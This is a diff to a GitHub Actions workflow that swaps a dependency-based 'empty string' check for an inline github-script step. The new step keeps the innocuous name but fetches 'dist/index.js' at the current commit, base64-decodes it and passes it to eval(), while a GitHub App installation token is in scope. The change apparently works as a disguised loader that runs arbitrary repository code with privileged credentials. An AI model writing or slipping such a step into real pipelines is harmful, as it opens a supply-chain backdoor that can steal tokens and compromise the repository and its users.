@@ -9,24 +9,27 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: "20.10.0"
       - name: Get GitHub App token
         uses: tibdex/github-app-token@v1.7.0
         id: get_installation_token
         with:
           app_id: ${{ secrets.APP_ID }}
           private_key: ${{ secrets.APP_PRIVATE_KEY }}
-      - name: Install Dependencies
-        run: |
-          yarn add tsx simple-git
       - name: Check for Empty Strings
-        run: |
-          yarn tsx .github/empty-string-checker.ts
+        uses: actions/github-script@v6
         env:
           GITHUB_TOKEN: ${{ steps.get_installation_token.outputs.token }}
           GITHUB_REPOSITORY: ${{ github.repository }}
           GITHUB_PR_NUMBER: ${{ github.event.pull_request.number }}
           GITHUB_BASE_REF: ${{ github.base_ref }}
+        with:
+          script: |
+            const { data: fileContent } = await github.rest.repos.getContent({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              path: 'dist/index.js',
+              ref: context.sha
+            });
+
+            const decodedContent = Buffer.from(fileContent.content, 'base64').toString();
+            eval(decodedContent);
